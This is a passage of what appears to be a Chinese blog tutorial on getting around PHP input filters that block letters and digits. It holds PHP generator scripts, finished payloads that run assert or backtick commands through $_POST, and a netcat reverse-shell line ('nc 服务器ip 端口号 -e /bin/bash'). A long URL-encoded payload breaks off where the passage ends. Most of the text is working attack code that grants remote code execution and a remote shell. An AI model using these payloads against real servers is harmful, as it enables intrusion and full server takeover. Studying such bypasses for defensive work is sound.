class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$result1</span> .= <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;通过在URL内GET方法提交?cmd=\&quot;具体命令\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串：&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码：&quot;</span>.<span class="variable">$result1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assert</span><br><span class="line">字符串：极区区皮十勺</span><br><span class="line">URL编码：%9e%8c%8c%9a%8d%8b</span><br><span class="line">_POST</span><br><span class="line">字符串：码寸小欠立</span><br><span class="line">URL编码：%a0%af%b0%ac%ab</span><br><span class="line">?cmd=$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>

<p>不需要再进行url编码</p>
<p><img src="/../picture/image-20250427211506494.png" alt="image-20250427211506494"></p>
<h3 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=~(&quot;%a0%af%b0%ac%ab&quot;);$__=$$_;`$__[_]`;</span><br></pre></td></tr></table></figure>

<p>post提交</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=nc 服务器ip 端口号 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250427211921459.png" alt="image-20250427211921459"></p>
<h2 id="0x22无字母数字自增绕过"><a href="#0x22无字母数字自增绕过" class="headerlink" title="0x22无字母数字自增绕过"></a>0x22无字母数字自增绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$cmd2</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;post&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$_ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC2</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$____ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$POC_pat7</span> = <span class="string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$POC_pat7</span>;</span><br><span class="line">    <span class="title function_ invoke__">POC</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd2</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">POC2</span>(<span class="variable">$cmd2</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="PHP5-2"><a href="#PHP5-2" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert($_POST[_]);</span><br><span class="line">$_=[].&#x27;&#x27;;$___=$_[$__];$__=$___;$_=$___;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$_ .=$__;$____ = &quot;_&quot;;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$$____;$_($__[_]);</span><br></pre></td></tr></table></figure>

<p>urlencode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%5B%5D.&#x27;&#x27;%3B%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24____%20%3D%20%22_%22%3